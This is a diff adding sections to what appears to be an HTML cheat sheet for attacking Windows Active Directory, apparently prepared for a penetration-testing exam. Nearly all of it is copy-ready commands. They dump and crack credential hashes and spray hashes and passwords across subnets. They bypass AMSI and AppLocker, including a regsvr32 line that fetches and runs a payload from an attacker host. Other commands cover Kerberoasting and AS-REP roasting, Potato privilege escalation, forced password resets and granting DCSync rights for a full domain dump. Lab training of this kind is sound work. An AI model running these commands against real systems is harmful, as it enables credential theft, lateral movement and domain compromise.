+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 8 — cached domain logons (DCC2)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Windows caches last 10 domain logons locally — even when DC unreachable.</span>
+<span class="c"># secretsdump pulls these automatically under [*] Cached domain logon info:</span>
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt;
+<span class="c"># Output looks like: corp.local/Administrator:$DCC2$10240#Administrator#abc123...</span>
+
+<span class="c"># DCC2 is a DIFFERENT hash format — much slower to crack than NTLM:</span>
+hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt --force
+<span class="c"># -m 2100 = MS-Cache v2 / DCC2</span>
+<span class="c"># NOTE: DCC2 hashes CANNOT be used for pass-the-hash — must crack to plaintext first</span></pre></div>
+
+      <!-- STEP 9: HASH SPRAY -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 9 — spray all dumped hashes across subnet</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Local admin hash — spray with --local-auth:</span>
+crackmapexec smb &lt;subnet&gt;/24 -u Administrator -H &lt;NThash&gt; --local-auth --continue-on-success
+<span class="c"># .\ prefix in output = local account hit</span>
+
+<span class="c"># Spray ALL local hashes (not just Administrator):</span>
+grep -oP 'Administrator.*:\K[a-f0-9]{32}' secretsdump_output.txt &gt; local_hashes.txt
+crackmapexec smb &lt;subnet&gt;/24 -u Administrator -H local_hashes.txt --local-auth --continue-on-success
+
+<span class="c"># Domain hash — spray without --local-auth:</span>
+crackmapexec smb &lt;subnet&gt;/24 -u &lt;domain_user&gt; -H &lt;NThash&gt; --continue-on-success
+<span class="c"># corp\ prefix in output = domain account hit</span>
+
+<span class="c"># On Pwn3d! hit — immediately secretsdump that machine too:</span>
+impacket-secretsdump &lt;domain&gt;/Administrator@&lt;new_IP&gt; -hashes ':&lt;NThash&gt;'
+<span class="c"># Different machine = different LSASS = different cached domain users</span></pre></div>
+
+      <!-- STEP 10: AV / APPLOCKER / AMSI -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 10 — AV / AppLocker / AMSI bypass</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Check AV status:</span>
+Get-MpComputerStatus | Select AMServiceEnabled,AntispywareEnabled,RealTimeProtectionEnabled
+sc query WinDefend
+
+<span class="c"># Check AppLocker policy (restricts what can execute):</span>
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+<span class="c"># If AppLocker active — use LOLBins (Living Off the Land Binaries):</span>
+<span class="c"># rundll32, regsvr32, mshta, wscript, cscript, installutil, regasm</span>
+<span class="c"># Example — run payload via regsvr32 (bypasses AppLocker):</span>
+regsvr32 /s /n /u /i:http://&lt;KALI&gt;:8080/shell.sct scrobj.dll
+
+<span class="c"># AMSI bypass in evil-winrm session:</span>
+menu                                <span class="c"># shows available bypasses</span>
+Bypass-4MSI                         <span class="c"># patches AMSI in memory — run before any tool</span>
+
+<span class="c"># Check PowerShell Constrained Language Mode:</span>
+$ExecutionContext.SessionState.LanguageMode
+<span class="c"># FullLanguage = unrestricted</span>
+<span class="c"># ConstrainedLanguage = restricted — use net.exe commands instead of PowerShell</span>
+
+<span class="c"># If PowerShell logging is on — use cmd.exe equivalents where possible:</span>
+<span class="c"># net user /domain instead of Get-ADUser</span>
+<span class="c"># net group instead of Get-ADGroup</span>
+<span class="c"># net accounts /domain instead of Get-ADDefaultDomainPasswordPolicy</span></pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> whoami /priv — SeImpersonatePrivilege Enabled</span>
+          <span class="sig-cmd">systeminfo | findstr /B /C:"OS Name" /C:"OS Version" <span class="sig-note">-- pick correct potato</span></span>
+          <span class="sig-cmd">.\GodPotato-NET4.exe -cmd "cmd /c whoami" <span class="sig-note">-- Win10/11, Server 2019/2022</span></span>
+          <span class="sig-cmd">.\PrintSpoofer64.exe -i -c cmd <span class="sig-note">-- Server 2016/2019 with spooler running</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> SeBackupPrivilege or SeRestorePrivilege Enabled</span>
+          <span class="sig-cmd">reg save HKLM\SAM C:\Temp\sam.bak && reg save HKLM\SYSTEM C:\Temp\system.bak <span class="sig-note">-- backup privilege lets you read any file including SAM</span></span>
+          <span class="sig-cmd">impacket-secretsdump -sam sam.bak -system system.bak LOCAL <span class="sig-note">-- parse offline</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> cmdkey /list shows saved admin credential</span>
+          <span class="sig-cmd">runas /savecred /user:&lt;domain&gt;\Administrator "C:\Windows\Temp\shell.exe" <span class="sig-note">-- no password needed, uses saved cred</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> autologon registry has DefaultPassword</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;DefaultUsername&gt; -p '&lt;DefaultPassword&gt;' --continue-on-success <span class="sig-note">-- spray it immediately</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> netstat shows 127.0.0.1:8080 or :3306 (internal only)</span>
+          <span class="sig-cmd">ssh -L 8080:127.0.0.1:8080 &lt;user&gt;@&lt;IP&gt; -N -f <span class="sig-note">-- forward to kali, then curl/attack locally</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> route print / arp -a shows unknown subnet (e.g. 172.16.1.0/24)</span>
+          <span class="sig-note">-- This machine is dual-homed. Set up Ligolo-ng pivot before moving on.</span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> secretsdump returns NTLM hashes (local accounts)</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u Administrator -H &lt;NThash&gt; --local-auth --continue-on-success <span class="sig-note">-- local hash spray</span></span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/Administrator@&lt;new_IP&gt; -hashes ':&lt;NThash&gt;' <span class="sig-note">-- dump LSASS on every Pwn3d! hit</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> secretsdump returns domain user hashes (corp\user:... in output)</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;domain_user&gt; -H &lt;NThash&gt; <span class="sig-note">-- test against DC immediately</span></span>
+          <span class="sig-cmd">bloodhound-python -u &lt;user&gt; --hashes ':&lt;NThash&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip <span class="sig-note">-- BloodHound with that account</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> secretsdump returns $DCC2$ hashes (cached domain logons)</span>
+          <span class="sig-cmd">hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt --force <span class="sig-note">-- crack to plaintext (cannot PTH with DCC2)</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> $ExecutionContext.SessionState.LanguageMode = ConstrainedLanguage</span>
+          <span class="sig-note">-- PowerShell restricted. Use cmd.exe + net.exe commands for domain enum instead.</span>
+          <span class="sig-cmd">net user /domain && net group "Domain Admins" /domain && net accounts /domain <span class="sig-note">-- LOL domain enum</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> AMSI / AV kills uploaded tools</span>
+          <span class="sig-cmd">Bypass-4MSI <span class="sig-note">-- in evil-winrm menu, patches AMSI in memory before running tools</span></span>
+          <span class="sig-cmd">regsvr32 /s /n /u /i:http://&lt;KALI&gt;:8080/shell.sct scrobj.dll <span class="sig-note">-- LOLBin execution if AppLocker blocks EXEs</span></span>
+        </div>
+      </div>
+
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">whoami /priv checked — no dangerous privileges, potato not viable</span>
+        <span class="moveon-item">unquoted paths + weak service perms + AIE all checked — no local privesc path</span>
+        <span class="moveon-item">cmdkey + autologon + registry + filesystem all searched — no plaintext creds</span>
+        <span class="moveon-item">SAM dumped (reg save) + secretsdump run remotely — all hashes extracted</span>
+        <span class="moveon-item">local hash spray done — Pwn3d! hits drained of LSASS too</span>
+        <span class="moveon-item">DCC2 hashes sent to hashcat in background — move to domain enum in parallel</span>
+        <span class="moveon-item">then proceed to domain enumeration below</span>
+      </div>
+    </section>
+
+    <section class="sec" id="domain-enum">
+      <div class="sec-head"><h2>Domain Enumeration — From This Machine</h2></div>
+      <div class="note n-info">You're on a domain-joined box — you can query the DC directly from here. These run in the context of your current user, even a low-priv one.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">basic domain context</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>echo %USERDOMAIN%                   <span class="c"># domain name</span>
+echo %LOGONSERVER%                  <span class="c"># which DC you authenticated to</span>
+nltest /dclist:&lt;domain&gt;            <span class="c"># list all DCs</span>
+nltest /domain_trusts               <span class="c"># domain trusts</span>
+net view /domain                    <span class="c"># all domains in forest</span>
+net view /domain:&lt;domain&gt;          <span class="c"># all machines in domain</span>
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  <span class="c"># PowerShell</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">domain users + groups</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>net user /domain                    <span class="c"># ALL domain users</span>
+net user &lt;username&gt; /domain         <span class="c"># specific user detail: groups, last logon, etc.</span>
+net group /domain                   <span class="c"># ALL domain groups</span>
+net group "Domain Admins" /domain   <span class="c"># members of Domain Admins</span>
+net group "Enterprise Admins" /domain
+net group "Domain Controllers" /domain
+net accounts /domain                <span class="c"># password policy + lockout threshold</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find DCs + shares from domain context</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>nslookup -type=SRV _ldap._tcp.dc._msdcs.&lt;domain&gt;  <span class="c"># find DC IPs via DNS</span>
+net view \\&lt;DC_hostname&gt; /all       <span class="c"># shares on the DC</span>
+
+<span class="c"># PowerShell — find all domain computers:</span>
+([adsisearcher]"objectCategory=computer").FindAll() | % {$_.Properties.name}
+
+<span class="c"># Find domain admins via LDAP from box:</span>
+([adsisearcher]"(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))").FindAll() | % {$_.Properties.samaccountname}</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">PowerView — if you can upload it</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Load (from evil-winrm: upload PowerView.ps1 first):</span>
+Import-Module .\PowerView.ps1
+
+Get-NetDomain                       <span class="c"># domain info</span>
+Get-NetDomainController             <span class="c"># all DCs</span>
+Get-NetUser | select samaccountname,description,memberof  <span class="c"># all users + descriptions</span>
+Get-NetUser | select samaccountname,description | Where-Object {$_.description -ne $null}
+Get-NetGroup "Domain Admins" -FullData  <span class="c"># DA group members</span>
+Get-NetComputer | select name,operatingsystem  <span class="c"># all computers + OS</span>
+Get-NetShare -ComputerName &lt;DC&gt;     <span class="c"># shares on DC</span>
+Invoke-ShareFinder                  <span class="c"># find readable shares across domain</span>
+Find-LocalAdminAccess               <span class="c"># find machines where current user is local admin</span>
+Get-ObjectAcl -SamAccountName &lt;user&gt; -ResolveGUIDs  <span class="c"># ACLs on a user object</span></pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> net user &lt;you&gt; /domain shows you're in IT Admins / Server Admins group</span>
+          <span class="sig-cmd">Find-LocalAdminAccess <span class="sig-note">-- check which machines you're already local admin on</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --continue-on-success <span class="sig-note">-- sweep from kali</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> net accounts /domain shows lockoutThreshold: 0</span>
+          <span class="sig-note">-- No lockout. Safe to spray every user with every password. Full matrix.</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u ~/exam/loot/users.txt -p ~/exam/loot/passwords.txt --continue-on-success <span class="sig-note">-- full spray</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Get-NetUser description field contains a password</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;found_pass&gt;' --continue-on-success <span class="sig-note">-- spray immediately</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> nltest /domain_trusts shows trust to another domain</span>
+          <span class="sig-note">-- Forest trust = potential lateral movement to other domain if you reach DA here first.</span>
+          <span class="sig-cmd">Get-NetDomainTrust <span class="sig-note">-- enumerate trust direction (one-way vs bidirectional)</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> nslookup / nltest returns DC IPs you didn't know</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --shares <span class="sig-note">-- enumerate new DC</span></span>
+          <span class="sig-cmd">bloodhound-python -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip <span class="sig-note">-- re-ingest with correct DC IP</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">domain context confirmed — you know the domain name, DC IP, your group memberships</span>
+        <span class="moveon-item">password policy checked — you know the lockout threshold before spraying</span>
+        <span class="moveon-item">users.txt built from net user /domain — move to BloodHound + authenticated attacks</span>
+      </div>
+    </section>
+
+    <!-- ========== AUTHENTICATED ========== -->
+    <div style="margin: 2rem 0 1rem; padding: 6px 12px; background: #3fb95012; border: 1px solid #3fb95044; border-radius: 6px; font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--green);">⬇ Authenticated — You have valid credentials</div>
+
+    <section class="sec" id="bloodhound">
+      <div class="sec-head"><h2>BloodHound — Run Immediately on First Creds</h2></div>
+      <div class="note n-good">BloodHound is your kill chain map. Run it the moment you have any valid creds. Everything else runs in parallel while it ingests.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">ingest with creds</span><div class="cb-tags"><span class="tag t-ad">first action</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>bloodhound-python -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip
+<span class="c"># With hash:</span>
+bloodhound-python -u &lt;user&gt; --hashes ':&lt;NThash&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip
+<span class="c"># Output: 20231015_bloodhound.zip → drag into BloodHound UI</span>
+
+<span class="c"># Start Neo4j + BloodHound:</span>
+sudo neo4j start
+bloodhound &amp;</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">queries to run immediately — in this order</span><div class="cb-tags"><span class="tag t-crit">critical</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># In BloodHound UI → Search bar → click these built-in queries:</span>
+
+<span class="c"># 1. Find all Domain Admins</span>
+<span class="c">#    → Who is DA? Mark them as High Value. Find shortest path TO them.</span>
+
+<span class="c"># 2. Find Shortest Paths to Domain Admins</span>
+<span class="c">#    → The kill chain. Follow every edge.</span>
+
+<span class="c"># 3. Find Principals with DCSync Rights</span>
+<span class="c">#    → Anyone besides DA with DCSync = instant domain dump path.</span>
+
+<span class="c"># 4. Find all users with path to DA (raw Cypher):</span>
+MATCH p=shortestPath((u:User)-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
+
+<span class="c"># 5. Kerberoastable users with path to DA:</span>
+MATCH (u:User {hasspn:true}) RETURN u.name,u.description
+
+<span class="c"># 6. AS-REP roastable users:</span>
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name
+
+<span class="c"># 7. All computers where current user is local admin:</span>
+MATCH (u:User {name:"&lt;USER&gt;@CORP.LOCAL"}),(c:Computer),p=((u)-[:AdminTo]-&gt;(c)) RETURN p
+
+<span class="c"># 8. Users with GenericAll / GenericWrite / WriteDACL / ForceChangePassword:</span>
+MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDACL|ForceChangePassword]-&gt;(v) RETURN p
+
+<span class="c"># 9. Computers with unconstrained delegation:</span>
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
+
+<span class="c"># 10. Find owned principals with path to DA (right-click node → Mark as Owned first):</span>
+MATCH p=shortestPath((o {owned:true})-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p</pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals — what you see in bloodhound → what to do</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Your user has GenericAll over another user</span>
+          <span class="sig-cmd">net rpc password &lt;targetuser&gt; 'NewP@ss123!' -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt; <span class="sig-note">-- reset their password</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;targetuser&gt; -p 'NewP@ss123!' <span class="sig-note">-- validate new creds</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Your user has GenericAll over a Group (e.g. IT Admins)</span>
+          <span class="sig-cmd">net rpc group addmem "&lt;group&gt;" &lt;youruser&gt; -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt; <span class="sig-note">-- add yourself to the group</span></span>
+          <span class="sig-cmd">net rpc group members "&lt;group&gt;" -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt; <span class="sig-note">-- verify membership</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Your user has WriteDACL over domain object</span>
+          <span class="sig-cmd">Add-DomainObjectAcl -TargetIdentity "&lt;domain&gt;" -PrincipalIdentity &lt;youruser&gt; -Rights DCSync <span class="sig-note">-- grant yourself DCSync (PowerView)</span></span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/&lt;youruser&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; -just-dc-ntlm <span class="sig-note">-- full domain dump</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Your user has ForceChangePassword over another user</span>
+          <span class="sig-cmd">net rpc password &lt;targetuser&gt; 'NewP@ss123!' -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt; <span class="sig-note">-- same as GenericAll → reset password</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Computer with unconstrained delegation found</span>
+          <span class="sig-cmd">impacket-psexec &lt;domain&gt;/&lt;localadmin&gt;:'&lt;pass&gt;'@&lt;computer&gt; <span class="sig-note">-- get shell on that machine</span></span>
+          <span class="sig-note">-- Once on the machine, any DA authenticating to it will leave their TGT in memory. Run Rubeus monitor.</span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Shortest path shows: owned user → AdminTo → Computer → path to DA</span>
+          <span class="sig-cmd">impacket-psexec &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;computer&gt; <span class="sig-note">-- shell on intermediate host</span></span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;computer&gt; <span class="sig-note">-- dump hashes, follow the chain</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> No path to DA visible from current user</span>
+          <span class="sig-note">-- Mark every owned account as Owned, re-run shortest path. Check Kerberoastable users — crack one, re-run.</span>
+          <span class="sig-cmd">MATCH (u:User {hasspn:true}) RETURN u.name,u.description <span class="sig-note">-- find Kerberoastable accounts, prioritize ones with juicy names (svc_admin, svc_backup)</span></span>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="auth-enum">
+      <div class="sec-head"><h2>Authenticated Enumeration</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">users, groups, shares, policy</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --users
+crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --groups
+crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --pass-pol  <span class="c"># lockout threshold!</span>
+crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --shares
+rpcclient -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" &lt;DC_IP&gt; -c "enumdomusers;querydispinfo"
+impacket-GetADUsers -all &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;
+
+<span class="c"># LDAP authenticated dump:</span>
+ldapsearch -x -H ldap://&lt;DC_IP&gt; -D "&lt;user&gt;@&lt;domain&gt;" -w '&lt;pass&gt;' \
+  -b "DC=corp,DC=local" "(objectClass=user)" \
+  sAMAccountName description memberOf userAccountControl servicePrincipalName \
+  2&gt;/dev/null | tee ~/exam/loot/ldap_auth.txt</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> --users returns full user list</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --users | awk '{print $5}' &gt; ~/exam/loot/users.txt <span class="sig-note">-- extract to users.txt</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> --pass-pol shows lockoutThreshold: 0</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u ~/exam/loot/users.txt -p ~/exam/loot/passwords.txt --continue-on-success <span class="sig-note">-- full matrix spray, no lockout risk</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Readable non-default share found</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M spider_plus <span class="sig-note">-- spider all readable shares</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">users.txt built and pass-pol checked — move to Kerberoasting immediately</span>
+        <span class="moveon-item">BloodHound ingestion running in background — don't wait for it, continue</span>
+      </div>
+    </section>
+
+    <section class="sec" id="kerberoast">
+      <div class="sec-head"><h2>Kerberoasting</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">request TGS hashes + crack</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request -outputfile ~/exam/loot/kerberoast.hashes
+<span class="c"># With hash:</span>
+impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt; -hashes ':&lt;NThash&gt;' -dc-ip &lt;DC_IP&gt; -request -outputfile ~/exam/loot/kerberoast.hashes
+
+hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
+hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> $krb5tgs$23$ hash returned</span>
+          <span class="sig-cmd">hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force <span class="sig-note">-- crack while continuing other enum</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Hash cracked — svc_mssql:Password123!</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u svc_mssql -p 'Password123!' --continue-on-success <span class="sig-note">-- check where this account works</span></span>
+          <span class="sig-cmd">impacket-mssqlclient &lt;domain&gt;/svc_mssql:'Password123!'@&lt;IP&gt; -windows-auth <span class="sig-note">-- try DB if service account</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> No SPNs found</span>
+          <span class="sig-note">-- No Kerberoastable accounts. Move to AS-REP roasting.</span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">no SPNs returned — skip to AS-REP</span>
+        <span class="moveon-item">hashes obtained, hashcat running in background — continue to AS-REP in parallel</span>
+        <span class="moveon-item">rockyou + best64 exhausted — park it, keep going</span>
+      </div>
+    </section>
+
+    <section class="sec" id="asrep">
+      <div class="sec-head"><h2>AS-REP Roasting — With Creds</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find no-preauth accounts + crack</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-GetNPUsers &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request -format hashcat -outputfile ~/exam/loot/asrep.hashes
+
+hashcat -m 18200 ~/exam/loot/asrep.hashes /usr/share/wordlists/rockyou.txt --force
+hashcat -m 18200 ~/exam/loot/asrep.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Hash cracked — new account obtained</span>
+          <span class="sig-cmd">bloodhound-python -u &lt;newuser&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip <span class="sig-note">-- re-ingest BloodHound with new account</span></span>
+          <span class="sig-cmd">impacket-GetUserSPNs &lt;domain&gt;/&lt;newuser&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request <span class="sig-note">-- re-run Kerberoast with new account</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">no accounts returned — move to password spray</span>
+        <span class="moveon-item">rockyou + rules exhausted — park hash, proceed with spray</span>
+      </div>
+    </section>
+
+    <section class="sec" id="spray">
+      <div class="sec-head"><h2>Password Spray</h2></div>
+      <div class="note n-bad">Check lockout threshold FIRST. Spray max threshold-2 passwords per round. Wait 30min between rounds.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">spray safely</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Check policy first:</span>
+crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --pass-pol
+
+kerbrute passwordspray -d &lt;domain&gt; --dc &lt;DC_IP&gt; ~/exam/loot/users.txt 'Password123!'
+kerbrute passwordspray -d &lt;domain&gt; --dc &lt;DC_IP&gt; ~/exam/loot/users.txt 'Welcome2024!'
+kerbrute passwordspray -d &lt;domain&gt; --dc &lt;DC_IP&gt; ~/exam/loot/users.txt '&lt;company&gt;2024!'
+crackmapexec smb &lt;DC_IP&gt; -u ~/exam/loot/users.txt -p 'Password123!' --continue-on-success</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> [+] VALID CREDENTIALS found</span>
+          <span class="sig-cmd">bloodhound-python -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip <span class="sig-note">-- re-ingest with new account</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --continue-on-success <span class="sig-note">-- sweep subnet</span></span>
+          <span class="sig-cmd">impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request <span class="sig-note">-- Kerberoast with new account</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> (Pwn3d!) next to a host</span>
+          <span class="sig-cmd">impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; <span class="sig-note">-- dump hashes</span></span>
+          <span class="sig-cmd">evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' <span class="sig-note">-- shell</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Account locked out</span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --pass-pol <span class="sig-note">-- recheck policy, wait full window</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">3 rounds exhausted — stop, don't lockout accounts</span>
